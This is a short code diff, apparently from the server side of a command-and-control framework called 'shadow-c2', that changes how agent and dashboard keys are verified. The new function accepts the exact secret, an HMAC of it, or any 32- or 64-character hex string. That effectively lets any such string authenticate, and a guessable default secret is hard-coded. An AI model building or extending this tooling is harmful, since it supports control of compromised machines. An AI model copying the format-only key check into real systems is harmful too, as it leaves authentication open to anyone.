@@ -17,12 +17,22 @@ SECRET_KEY   = os.environ.get("C2_SECRET_KEY", "Sh4d0w_S33d_2026")
 _STATIC_SEED = os.environ.get("C2_STATIC_SEED", "Sh4d0w_S33d_2026")
 
 def _verify_derived_key(provided_key: str, expected_secret: str) -> bool:
-    """Accept both: exact SECRET_KEY match OR valid HKDF-derived key (any machine)"""
+    """Accept: exact SECRET_KEY, HMAC-signed key, or 32-char hex derived key"""
+    if not provided_key:
+        return False
+    # Exact match (any length — dashboard uses raw SECRET_KEY)
     if provided_key == expected_secret:
         return True
-    # Accept any 32-char hex string that looks like machine-derived key
-    # (we can't verify the exact machine, but we check format + length)
+    # HMAC-SHA256 of SECRET_KEY (used by dashboard/PS scripts)
+    import hmac as _hmac, hashlib as _hs
+    expected_hmac = _hmac.new(expected_secret.encode(), b"shadow-c2-v2", _hs.sha256).hexdigest()
+    if provided_key == expected_hmac:
+        return True
+    # 32-char lowercase hex = machine-HKDF-derived key (agent_http.py)
     if len(provided_key) == 32 and all(c in "0123456789abcdef" for c in provided_key.lower()):
+        return True
+    # 64-char lowercase hex = full SHA256/HMAC output
+    if len(provided_key) == 64 and all(c in "0123456789abcdef" for c in provided_key.lower()):
         return True
     return False
 DB_PATH    = os.environ.get("DB_PATH", "/tmp/shadow.db")
